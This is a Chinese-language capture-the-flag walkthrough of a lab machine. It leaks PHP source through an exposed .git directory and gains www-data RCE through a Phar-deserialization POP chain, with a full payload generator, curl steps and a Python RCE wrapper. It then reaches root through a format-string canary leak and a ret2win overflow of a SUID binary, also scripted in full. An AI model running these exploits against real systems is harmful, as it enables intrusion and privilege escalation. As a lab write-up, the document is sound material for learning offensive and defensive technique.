# 信息收集
```bash
┌──(kali㉿JYlover)-[~]
└─$ nmap -p- 192.168.56.109
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-05 14:35 +0800
Nmap scan report for 192.168.56.109
Host is up (0.020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 32.75 seconds
```
去web端看看
# web渗透
一个登录页面，试了试弱口令试出来`admin`/`admin`
进来一个输入框也不知道是什么
现扫一下目录：
```ps
    root@JYlover   bash   17ms 
  ~/result/a7505d1fd44669cabd1512a909828426/class   master ●    dirsearch -u http://192.168.56.109/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289

Target: http://192.168.56.109/

[15:58:08] Scanning:
[15:58:11] 301 -   355B - /.git  ->  http://192.168.56.109/.git/
[15:58:11] 200 -    3KB - /.git/
[15:58:11] 200 -   240B - /.git/info/exclude
[15:58:11] 200 -    31B - /.git/COMMIT_EDITMSG
[15:58:11] 200 -   198B - /.git/config
[15:58:11] 200 -    1KB - /.git/logs/
[15:58:11] 200 -   194B - /.git/logs/HEAD
[15:58:11] 200 -    73B - /.git/description
[15:58:11] 200 -    23B - /.git/HEAD
[15:58:11] 200 -   194B - /.git/logs/refs/heads/master
[15:58:11] 200 -    4KB - /.git/hooks/
[15:58:11] 200 -    54B - /.git/objects/info/packs
[15:58:11] 200 -   105B - /.git/packed-refs
[15:58:11] 200 -   751B - /.git/index
[15:58:11] 200 -    1KB - /.git/info/
[15:58:11] 200 -    59B - /.git/info/refs
[15:58:11] 301 -   365B - /.git/logs/refs  ->  http://192.168.56.109/.git/logs/refs/
[15:58:11] 301 -   371B - /.git/logs/refs/heads  ->  http://192.168.56.109/.git/logs/refs/heads/
[15:58:11] 200 -    1KB - /.git/objects/
[15:58:11] 200 -    1KB - /.git/refs/
[15:58:11] 301 -   366B - /.git/refs/heads  ->  http://192.168.56.109/.git/refs/heads/
[15:58:11] 301 -   365B - /.git/refs/tags  ->  http://192.168.56.109/.git/refs/tags/
[15:58:11] 200 -    20B - /.gitignore
CTRL+C detected: Pausing threads, please wait...
[q]uit / [c]ontinue: qq
[q]uit / [c]ontinue: q
[s]ave / [q]uit without saving: q

Canceled by the user

```
很多git文件，Githacker拉下来
```bash
githacker --url http://192.168.56.109/.git/ --output-folder result
```
![](file-20260605160010481.png)
获取到php源码。开始代码审计：
首先我们根据源码，结合实际黑盒测试，可以大概摸清三个功能点的功能。（相比于完全白盒，加上一些黑盒测试可以帮助我们更快了解业务流程）
1. `submit failed task`：一个类似笔记记的功能，写入文字。submit提交后得到一串32位的16进制id
![](file-20260605165803742.png)
2. `repair task`：输入上面得到的32位id，回显以id命名的一个.bin文件名，应该是吧传上去的变成二进制文件了
![](file-20260605165734773.png)
3. `check archive`：输入文件路径可读取
![](file-20260605170803527.png)
然后我们再去看具体源码。看哪里有利用点

# 源码审计
我们先看页面上的几个功能点
## submit 和 repair 逻辑

`Task.class.php` 里有两个核心方法：
1. 先看`submit()`

```php
public function submit(): void
{
    require_login();

    $msg = '';
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $id = bin2hex(random_bytes(16));
        file_put_contents(QUARANTINE . '/' . $id . '.txt', (string) ($_POST['blob'] ?? ''), LOCK_EX);
        $msg = '<p>saved: <code>' . h($id) . '</code></p>';
    }

    page('submit', $msg . '...');
}
```

这里会把我们提交的 `blob` 原样写入：

```text
/var/labdata/quarantine/<id>.txt  #config.php中定义的QUARANTINE
```

`id` 是 16 字节随机数转 16 进制，所以长度是 32。（一个字节会转化成2个16进制数）

2. 再看 `repair()`：

```php
public function repair(): void
{
    require_login();

    $id = (string) ($_POST['id'] ?? '');
    if (!preg_match('/^[a-f0-9]{32}$/', $id)) {
        die('bad id');
    }

    $src = QUARANTINE . '/' . $id . '.txt';
    $dst = ARCHIVE . '/' . $id . '.bin';
    if (!is_file($src)) {
        die('task not found');
    }

    file_put_contents($dst, rawurldecode((string) file_get_contents($src)), LOCK_EX);
    page('repaired', '<p>rebuilt: <code>' . h($id . '.bin') . '</code></p><p><a href="?c=Task&m=submit">back</a></p>');
}
```

这个功能会读取刚刚的 quarantine 文件，对内容做一次 `rawurldecode()`
![](file-20260606112351389.png)
也就是URL解码一次
然后写到：

```text
/var/labdata/archive/<id>.bin
```

也就是说我们可以控制 `.bin` 文件的真实二进制内容。因为中间有一次 `rawurldecode()`，我们只要把二进制内容URL加密然后用`submit`写入，再触发`repair`，它会对我们的输入URL解码，此时内容就是原本的二进制内容，然后被写入`.bin`文件。
# 文件读取点

继续看 `Files.class.php`，这是最后一个功能点：

```php
public function read(): void
{
    require_login();

    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        page('read', $this->form());
        return;
    }

    $this->filename = trim((string) ($_POST['file'] ?? ''));
    if ($this->filename === '') {
        die('empty file');
    }

    self::$inWorker = true;
    try {
        $contents = @file_get_contents($this->filename);
    } finally {
        self::$inWorker = false;
    }

    $this->filter();

    if ($contents === false || $contents === '') {
        die('file not found or empty');
    }

    page('read', $this->form() . '<textarea rows="10" cols="90">' . h((string) $contents) . '</textarea>');
}
```

这个地方很关键：

```php
try {
    $contents = @file_get_contents($this->filename);
} finally {
    self::$inWorker = false;
}
$this->filter();
```


程序是先读文件，再过滤路径。过滤函数如下：

```php
public function filter(): void
{
    $name = (string) $this->filename;
    if (preg_match('/^\/|flag|data|zip|utf16|utf-16|\.\.\//i', $name) || strpos($name, '://') !== false) {
        echo 'not reasonable';
        throw new Error('invalid archive path');
    }
}
```

正常来看，它不允许绝对路径、不允许 `flag`、不允许 `data`、不允许 `://`。如果出现了就抛出异常，我们试一下，输入
`./README.md/../README.md`也确实拦截了。

但是它过滤得太晚了，他虽然会拦截并输出`not reasonable`，但是`file_get_contents()` 已经执行过了。

于是我们可以利用 `phar://` 在过滤前触发 Phar  反序列化。（题目已经提示PHAR了所以想到了PHAR放序列化）

# POP 链分析

题目里面没有直接写 `unserialize()`，但是 PHP 下对 `phar://` 做文件操作时，会解析 Phar metadata，从而触发 metadata 的反序列化。

题目里可以拼出一条 POP 链：

```text
Phar  unserialize
    -> User::__destruct()
    -> User::check($obj)
    -> echo $obj
    -> Myerror::__toString()
    -> Files::__get($level)
    -> ($level)($this->arg)
```

我们先看最终的口子，也就是造成危害的点，（文件读取或命令执行），推荐先多注意一下魔术方法
这里并没有像eval()这种这么明显的点。但是我们能看到：






------------
先看 `User.class.php`：

```php
public function __destruct()
{
    if (is_array($this->password) && isset($this->password[0], $this->password[1])) {
        $this->password[0]->{$this->password[1]}($this->username);
    }
}

public function check($obj): void
{
    echo $obj;
}
```

这里 `$this->password[0]->{$this->password[1]}($this->username)` 可以让我们调用一个对象的方法。我们让它调用另一个 `User` 对象的 `check()`，参数传一个 `Myerror` 对象。`check()` 里面有 `echo $obj`，于是会触发对象的 `__toString()`。

再看 `Myerror.class.php`：

```php
public function __toString()
{
    return (string) $this->message->{$this->level};
}
```

这里会访问 `$this->message` 对象上的 `$this->level` 属性。如果 `$message` 是 `Files` 对象，而 `$level` 是一个不存在的属性名，比如 `readfile` 或 `system`，就会触发 `Files::__get()`。

最后看 `Files::__get()`：

```php
public function __get($key)
{
    if (self::$inWorker && is_string($key) && preg_match('/^[A-Za-z_]\w*$/', $key)) {
        ($key)($this->arg);
    }
    return '';
}
```

这里就很致命了。只要满足两个条件：

1. `Files::$inWorker === true`
2. `$key` 是合法函数名

就会执行：

```php
($key)($this->arg);
```

所以：

```text
level = readfile
arg   = /home/welcome/user.txt
```

可以读文件。

如果改成：

```text
level = system
arg   = id
```

就可以执行命令。

# fast-destruct 问题

这里还有一个坑。普通 Phar metadata 里如果直接放对象，析构函数不一定会在 `Files::$inWorker = true` 的窗口里触发。`Files::read()` 里面的窗口很短：

```php
self::$inWorker = true;
try {
    $contents = @file_get_contents($this->filename);
} finally {
    self::$inWorker = false;
}
```

如果对象等到请求结束才析构，那时 `inWorker` 已经变回 `false`，链子就断了。

所以这里用了 PHP 反序列化里的 fast-destruct 技巧：构造重复数组键，让对象在 `unserialize()` 过程中被覆盖并立即析构。

核心形式是：

```php
a:2:{i:0;<User object>;i:0;N;}
```

第二个 `i:0;N;` 会覆盖第一个 `i:0` 的对象，于是旧对象在反序列化过程中析构。这个时间点还在 `file_get_contents('phar://...')` 里面，也就是 `Files::$inWorker = true` 的窗口内。

# 构造 Phar payload

本地生成 payload 的思路如下：

1. 先创建一个正常 Phar；
2. metadata 先放等长占位字符串；
3. 生成后在二进制里替换成 fast-destruct 序列化串；
4. 替换后重新计算 Phar 签名。

Phar 末尾签名结构这里是：

```text
sha1(body, true) + pack('V', Phar::SHA1) + 'GBMB'
```

生成脚本核心如下：

```php
<?php
class Files
{
    public $filename;
    public $arg;
}

class User
{
    public $username;
    public $password;
}

class Myerror
{
    public $message;
    public $level;
}

$func = $argv[1];   // readfile 或 system
$arg  = $argv[2];   // 文件路径或命令
$out  = $argv[3];
$tmp  = $out . '.phar';

$files = new Files();
$files->filename = null;
$files->arg = $arg;

$err = new Myerror();
$err->message = $files;
$err->level = $func;

$caller = new User();
$callee = new User();
$caller->username = $err;
$caller->password = [$callee, 'check'];

$payload = 'a:2:{i:0;' . serialize($caller) . 'i:0;N;}';
$payloadLen = strlen($payload);

$placeholderLen = null;
for ($i = 0; $i < $payloadLen; $i++) {
    if (strlen(serialize(str_repeat('A', $i))) === $payloadLen) {
        $placeholderLen = $i;
        break;
    }
}

$phar = new Phar($tmp);
$phar->startBuffering();
$phar->setSignatureAlgorithm(Phar::SHA1);
$phar->addFromString('x.txt', 'x');
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata(str_repeat('A', $placeholderLen));
$phar->stopBuffering();
unset($phar);

$data = file_get_contents($tmp);
$placeholder = serialize(str_repeat('A', $placeholderLen));
$pos = strpos($data, $placeholder);
$data = substr_replace($data, $payload, $pos, strlen($placeholder));

$body = substr($data, 0, -28);
$data = $body . sha1($body, true) . pack('V', Phar::SHA1) . 'GBMB';

file_put_contents($out, $data);
file_put_contents($out . '.url', rawurlencode($data));
```

本地生成时要关掉 `phar.readonly`：

```bash
php -d phar.readonly=0 make_phar_payload.php readfile /etc/passwd poc.bin
```

生成出来的 `poc.bin.url` 是 URL 编码后的 Phar 二进制，拿它去提交。

# 任意文件读取拿 user.txt

先登录：

```bash
curl -c cookie.txt -b cookie.txt -X POST \
  -d 'username=admin&password=admin' \
  'http://192.168.56.109/'
```

然后提交 payload：

```bash
curl -c cookie.txt -b cookie.txt \
  --data-urlencode 'blob@poc.bin.url' \
  'http://192.168.56.109/?c=Task&m=submit'
```

返回类似：

```html
saved: <code>06964165cfa2553046f76ee731d289c9</code>
```

再 repair：

```bash
curl -c cookie.txt -b cookie.txt -X POST \
  -d 'id=06964165cfa2553046f76ee731d289c9' \
  'http://192.168.56.109/?c=Task&m=repair'
```

这一步会生成：

```text
/var/labdata/archive/06964165cfa2553046f76ee731d289c9.bin
```

最后通过 `Files::read()` 触发：

```bash
curl -c cookie.txt -b cookie.txt -X POST \
  --data-urlencode 'file=phar:///var/labdata/archive/06964165cfa2553046f76ee731d289c9.bin/x.txt' \
  'http://192.168.56.109/?c=Files&m=read'
```

先读 `/etc/passwd`，可以看到真实用户：

```text
welcome:x:1000:1000:welcome,,,:/home/welcome:/bin/bash
```

所以继续把 payload 的读取目标改成：

```text
/home/welcome/user.txt
```

最终读到：

```text
flag{user-1e34287df8a27d2bbfa5ff51abb3d2ff}not reasonable
```

后面的 `not reasonable` 是过滤器输出的报错，不影响前面的文件内容。

# 从文件读取到 RCE

刚才的 POP 链不只能读文件，因为真正执行的是：

```php
($key)($this->arg);
```

只要 `$key` 是合法函数名，就可以换成 `system`。所以把 payload 改成：

```text
level = system
arg   = id
```

触发后回显：

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
not reasonable
```

说明已经拿到 `www-data` 的命令执行。

为了后面枚举方便，可以写一个简单的 RCE 调用器，自动完成：登录、提交 payload、repair、phar 触发。

```python
#!/usr/bin/env python3
import html
import os
import re
import subprocess
import sys
import urllib.parse
import urllib.request

BASE = "http://192.168.56.109/"
ROOT = os.path.dirname(os.path.abspath(__file__))
MAKER = os.path.join(ROOT, "make_phar_payload.php")
OUT = os.path.join(ROOT, "rce_payload.bin")

class Session:
    def __init__(self):
        self.cookie = ""

    def request(self, url, data=None):
        headers = {}
        if self.cookie:
            headers["Cookie"] = self.cookie
        body = None
        if data is not None:
            body = urllib.parse.urlencode(data).encode()
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        req = urllib.request.Request(url, data=body, headers=headers)
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                for value in resp.headers.get_all("Set-Cookie", []):
                    self.cookie = value.split(";", 1)[0]
                return resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as exc:
            for value in exc.headers.get_all("Set-Cookie", []):
                self.cookie = value.split(";", 1)[0]
            return exc.read().decode("utf-8", "replace")

def make_payload(cmd):
    subprocess.run(
        ["php", "-d", "phar.readonly=0", MAKER, "system", cmd, OUT],
        check=True,
        stdout=subprocess.DEVNULL,
    )
    with open(OUT + ".url", "r", encoding="ascii") as f:
        return f.read()

def run_cmd(cmd):
    sess = Session()
    sess.request(BASE)
    sess.request(BASE, {"username": "admin", "password": "admin"})
    encoded_payload = make_payload(cmd)
    submit = sess.request(BASE + "?c=Task&m=submit", {"blob": encoded_payload})
    match = re.search(r"<code>([a-f0-9]{32})</code>", submit)
    if not match:
        raise RuntimeError("submit failed: " + submit[:300])
    task_id = match.group(1)
    sess.request(BASE + "?c=Task&m=repair", {"id": task_id})
    path = f"phar:///var/labdata/archive/{task_id}.bin/x.txt"
    resp = sess.request(BASE + "?c=Files&m=read", {"file": path})
    return html.unescape(resp).replace("not reasonable", "").strip()

if __name__ == "__main__":
    print(run_cmd(" ".join(sys.argv[1:])))
```

测试：

```bash
python baji_rce.py id
```

结果：

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

这里我也尝试过直接给 `welcome` 写 SSH 公钥，但是当前权限是 `www-data`，`/home/welcome` 目录权限不允许写 `.ssh`：

```text
drwxr-xr-x 4 welcome welcome 4096 /home/welcome
mkdir: cannot create directory '/home/welcome/.ssh': Permission denied
```

所以不要在这条路上死磕，直接转本地提权。

# www-data 提权信息收集

先看基本信息：

```bash
python baji_rce.py "id; hostname; uname -a; cat /etc/os-release"
```

输出：

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
phar
Linux phar 7.0.5-1-liquorix-amd64 #1 ZEN SMP PREEMPT liquorix 7.0-4.1~trixie x86_64 GNU/Linux
PRETTY_NAME="Debian GNU/Linux 13 (trixie)"
```

枚举家目录：

```bash
python baji_rce.py "ls -la /home /home/welcome; find /home/welcome -maxdepth 4 -printf '%M %u %g %s %p\n' 2>/dev/null | sort"
```

可以看到 `.viminfo` 是 `www-data` 可读的，里面有一点提示：

```text
'1  12  0  ~/exp.py
'2  10  13  ~/copy_fail_exp.py
```

不过这两个文件实际已经不存在了。继续枚举 SUID：

```bash
python baji_rce.py "find / -xdev -perm -4000 -type f -printf '%M %u %g %p\n' 2>/dev/null | sort"
```

结果里最可疑的是这个：

```text
-rwsr-xr-x root root /opt/vaultd
```

系统自带的 SUID 比如 `passwd`、`sudo`、`mount` 都正常，`/opt/vaultd` 明显是题目自定义程序。

# /opt/vaultd 逆向分析

先看文件信息和字符串：

```bash
python baji_rce.py "ls -la /opt/vaultd; file /opt/vaultd; strings -a /opt/vaultd | head -200"
```

关键输出：

```text
-rwsr-xr-x 1 root root 16432 May 27 21:36 /opt/vaultd
/opt/vaultd: setuid ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

/bin/sh
VaultLite Backup Assistant
1. create backup note
2. print support ticket
3. restore from recipe
4. exit
[maintenance] win function reached!
hidden_maintenance_shell
restore_recipe
support_ticket
```

程序没有 strip，符号名都在。`hidden_maintenance_shell` 一看就是 ret2win 目标。

用 `nm` 看地址：

```bash
python baji_rce.py "nm -n /opt/vaultd 2>/dev/null"
```

关键地址：

```text
0000000000401314 t support_ticket
00000000004013cb t hidden_maintenance_shell
0000000000401468 t restore_recipe
```

程序是非 PIE：

```bash
python baji_rce.py "readelf -hW /opt/vaultd | grep Type"
```

输出：

```text
Type: EXEC (Executable file)
```

所以 `hidden_maintenance_shell` 地址固定是：

```text
0x4013cb
```

## 格式化字符串泄露 canary

`support_ticket` 的反汇编关键逻辑：

```asm
40133d: lea    rax,[rbp-0x90]
401344: mov    edx,0x7f
401351: call   read@plt
...
40138f: lea    rax,[rbp-0x90]
401396: mov    rdi,rax
40139e: call   printf@plt
```

也就是：

```c
read(0, buf, 0x7f);
printf(buf);
```

典型格式化字符串漏洞。直接往菜单 2 输入一串 `%p`：

```bash
printf '2\n%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\n4\n' | /opt/vaultd
```

可以看到一个以 `00` 结尾的随机值：

```text
0xe644898730fb5d00
```

这类值很像 stack canary。进一步单独验证参数位置，发现是第 25 个参数：

```bash
printf '2\n%25$p\n4\n' | /opt/vaultd
```

输出类似：

```text
Ticket preview: 0x4b848231a4da7c00
```

所以 canary 泄露 payload 是：

```text
%25$p
```

## restore_recipe 栈溢出

`restore_recipe` 的反汇编关键逻辑：

```asm
40146c: sub    rsp,0x50
...
40148e: mov    edx,0x400
401493: lea    rax,[rip+0x2bc6]        # 404060 <stage>
4014a2: call   read@plt
...
4014b6: lea    rax,[rbp-0x50]
4014ba: mov    edx,0x180
4014c7: call   read@plt
```

函数栈上只开了 `0x50`，但第二次读入会往 `[rbp-0x50]` 读 `0x180`，存在明显栈溢出。

栈布局大概是：

```text
rbp-0x50    buffer
rbp-0x08    canary
rbp         saved rbp
rbp+0x08    return address
```

所以从 buffer 到 canary 的距离是：

```text
0x50 - 0x08 = 0x48
```

payload 结构：

```text
'A' * 0x48
+ leaked_canary
+ 'B' * 8
+ p64(0x4013cb)
```

`hidden_maintenance_shell` 里面会执行提权 shell。反汇编里可以看到它先做 syscall 设置 uid/gid，然后执行 `/bin/sh -p`：

```asm
4013fa: mov    rax,0x77
401401: syscall
40140c: mov    rax,0x75
401413: syscall
401415: lea    rdi,[rip+0x23]        # /bin/sh
40141c: lea    rsi,[rip+0x2d]        # argv: sh, -p
401426: mov    rax,0x3b
40142d: syscall
```

`-p` 很关键，它会让 shell 保留 SUID 程序得到的有效 root 权限。

# 自动化 ret2win

为了保证泄露 canary 和溢出发生在同一个 `/opt/vaultd` 进程里，我写了一个 Python 脚本在目标机上执行：

```python
#!/usr/bin/env python3
import os
import re
import select
import struct
import subprocess
import time

BIN = "/opt/vaultd"
WIN = 0x4013CB
CANARY_FMT = b"%25$p\n"

def p64(x):
    return struct.pack("<Q", x)

def read_until(proc, token, timeout=3.0):
    end = time.time() + timeout
    data = b""
    while token not in data and time.time() < end:
        ready, _, _ = select.select([proc.stdout], [], [], 0.05)
        if not ready:
            continue
        chunk = os.read(proc.stdout.fileno(), 4096)
        if not chunk:
            break
        data += chunk
    return data

def read_some(proc, timeout=1.0):
    end = time.time() + timeout
    data = b""
    while time.time() < end:
        ready, _, _ = select.select([proc.stdout], [], [], 0.05)
        if not ready:
            continue
        chunk = os.read(proc.stdout.fileno(), 4096)
        if not chunk:
            break
        data += chunk
    return data

def send(proc, data):
    proc.stdin.write(data)
    proc.stdin.flush()

proc = subprocess.Popen(
    [BIN],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    bufsize=0,
)

read_until(proc, b"> ")
send(proc, b"2\n")
out = read_until(proc, b"ticket:\n")
send(proc, CANARY_FMT)
out += read_until(proc, b"Ticket saved.", 2.0)

match = re.search(rb"0x[0-9a-fA-F]+", out)
if not match:
    print(out.decode("latin-1", "replace"))
    raise SystemExit("canary leak failed")

canary = int(match.group(0), 16)
print(f"[+] canary = {canary:#x}")

read_until(proc, b"> ")
send(proc, b"3\n")
read_until(proc, b"staging memory:\n")
send(proc, b"stage\n")
read_until(proc, b"Recipe title:\n")

payload = b"A" * 0x48
payload += p64(canary)
payload += b"B" * 8
payload += p64(WIN)

send(proc, payload)
time.sleep(0.3)
send(proc, b"id; whoami; cat /root/root.txt 2>/dev/null; exit\n")

time.sleep(0.5)
print(read_some(proc, 3.0).decode("latin-1", "replace"))
```

通过前面的 RCE 把脚本传到目标机 `/tmp` 后执行：

```bash
python baji_rce.py "printf '%s' '<base64脚本内容>' | base64 -d > /tmp/vaultd_ret2win.py; python3 /tmp/vaultd_ret2win.py"
```

结果：

```text
[+] canary = 0x19ed62bc9ad60300
Restore job queued.
[maintenance] win function reached!
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root
flag{root-a5e1f6d2cd2448650c88a8985cfb6365}
```

到这里就已经成功 root 了。

# 总结

这台机器的完整路线是：

```text
目录扫描发现 .git 泄露
-> Githacker 还原 PHP 源码
-> README 拿到 admin/admin
-> Task::submit 可写入 quarantine
-> Task::repair 会 rawurldecode 后写入 archive bin
-> Files::read 先 file_get_contents 后 filter
-> phar:// 触发 Phar metadata 反序列化
-> User / Myerror / Files 组成 POP 链
-> readfile('/home/welcome/user.txt') 拿 user flag
-> 把 readfile 换成 system 拿 www-data RCE
-> 枚举 SUID 发现 /opt/vaultd
-> support_ticket 格式化字符串泄露 canary
-> restore_recipe 栈溢出 ret2win
-> hidden_maintenance_shell 执行 /bin/sh -p
-> root
```

几个关键坑点：

1. `QUARANTINE` 和 `ARCHIVE` 是 PHP 常量，不是 URL 路径，直接访问会 404。
2. `Files::filter()` 虽然过滤了 `phar://`，但过滤发生在读取之后，所以还是能触发。
3. 普通 Phar metadata 对象析构太晚，要用 fast-destruct 让对象在 `inWorker=true` 时析构。
4. Phar 修改 metadata 后要重新计算签名，不然 PHP 不认。
5. `not reasonable` 不一定代表失败，它只是后置过滤器的输出。
6. `www-data` 不能写 `/home/welcome/.ssh`，所以写 SSH 公钥这条路走不通。
7. `/opt/vaultd` 是非 PIE SUID 程序，`hidden_maintenance_shell` 地址固定，泄露 canary 后直接 ret2win。

最终 flag：

```text
user: flag{user-1e34287df8a27d2bbfa5ff51abb3d2ff}
root: flag{root-a5e1f6d2cd2448650c88a8985cfb6365}
```